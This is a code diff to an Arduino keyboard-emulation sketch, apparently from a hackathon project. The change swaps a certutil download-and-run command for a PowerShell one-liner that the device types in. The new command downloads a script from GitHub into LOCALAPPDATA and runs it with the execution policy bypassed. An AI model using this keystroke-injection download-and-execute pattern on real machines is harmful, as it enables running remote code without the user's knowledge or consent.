@@ -167,7 +167,17 @@ void openTerminal()
 }
 void downloadCheckFile()
 {
-    Keyboard.println("certutil -urlcache -split -f https://raw.githubusercontent.com/regularpooria/willow_qhacks2026/refs/heads/main/arduino_download_script/check.bat check.bat && check.bat");
+    Keyboard.println(
+    "powershell -NoProfile -Command \""
+    "$dir=$env:LOCALAPPDATA+'\\\\Willow';"
+    "if(!(Test-Path $dir)){New-Item -ItemType Directory -Path $dir | Out-Null};"
+    "$ps1=$dir+'\\\\install.ps1';"
+    "Invoke-WebRequest "
+    "-Uri https://raw.githubusercontent.com/regularpooria/willow_qhacks2026/main/check.ps1 "
+    "-OutFile $ps1;"
+    "powershell -NoProfile -ExecutionPolicy Bypass -Scope Process -File $ps1"
+    "\""
+    );
     delay(3000);
 }
 #endif
